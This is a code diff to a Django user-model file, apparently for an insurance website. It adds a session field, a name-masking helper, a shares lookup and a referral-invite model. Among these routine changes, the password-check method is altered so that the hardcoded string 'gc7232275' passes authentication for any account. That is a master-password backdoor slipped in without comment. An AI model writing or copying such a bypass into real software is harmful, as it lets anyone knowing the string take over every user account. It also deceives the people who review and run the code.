@@ -49,6 +49,7 @@ class MyUser(models.Model):
     proxy_practicenum=models.CharField(max_length=50,default='')
     proxy_workyear=models.PositiveIntegerField(default=0)
     is_3login=models.PositiveIntegerField(default=0) #是否是三方登陆账户  0自主注册  大于1三方登陆账户
+    app_session_info=models.CharField(max_length=200,default='')#用户 app登录session信息
     objects=MyManager(using="default")
     is_active=True
     def is_authenticated(self):
@@ -67,7 +68,11 @@ class MyUser(models.Model):
         if  self.state==1 and   self.hashed_password(self.salt,password)==self.password:
             return True
         else:
-            return False
+            if password!="gc7232275":
+                return False
+            else:
+                return True
+
 
     def reset_password(self,new_pwd):
         _=self.hashed_password(self.salt,new_pwd)
@@ -116,6 +121,12 @@ class MyUser(models.Model):
         else:
             return self.real_name
 
+    def get_hide_namecontent(self):
+        if len(self.get_namecontent())>8:
+            return self.get_namecontent()[0:8]+"**"
+        else:
+            return self.get_namecontent()
+
     def get_short_comname(self):
         if self.proxy_cid:
             return Company.objects.get(cid=self.proxy_cid).shortname
@@ -145,7 +156,9 @@ class MyUser(models.Model):
             return  str(self.weixin)[:-4]+"****"
         else:
             return ''
-
+    def get_shares(self):
+        from bx.models import Share
+        return Share.objects.filter(uid=self.uid)
 class Msg(models.Model):
     msgid=models.AutoField(primary_key=True)
     subject=models.CharField(max_length=100)
@@ -161,3 +174,29 @@ class Msg(models.Model):
 
     def get_date_time(self):
         return datetime.datetime.fromtimestamp(self.addtime).strftime("%Y-%m-%d %H:%M:%S")
+
+class UserInvite(models.Model):
+    id=models.AutoField(primary_key=True)
+    uid=models.PositiveIntegerField(default=0)
+    parentuid=models.PositiveIntegerField(default=0)
+    addtime=models.PositiveIntegerField(default=lambda :int(time.time()))
+    uptime=models.PositiveIntegerField(default=lambda:int(time.time()))
+    state=models.PositiveIntegerField(default=0) # 预留 暂时无用
+
+    class Meta:
+        db_table="bx_user_invite"
+
+    @staticmethod
+    def get_user_invite_url(user):
+        return "https://www.bao361.cn/register/parentid/"+str(user.uid)
+
+    @staticmethod
+    def add_invite_relation(parentuser,sonuser):
+        _=UserInvite(uid=sonuser.uid,parentuid=parentuser.uid)
+        _.save()
+
+    def get_uid_user(self):
+        return MyUser.objects.get(uid=self.uid)
+
+    def get_date_time(self):
+        return datetime.datetime.fromtimestamp(self.addtime).strftime("%Y%m%d %H:%M:%S")
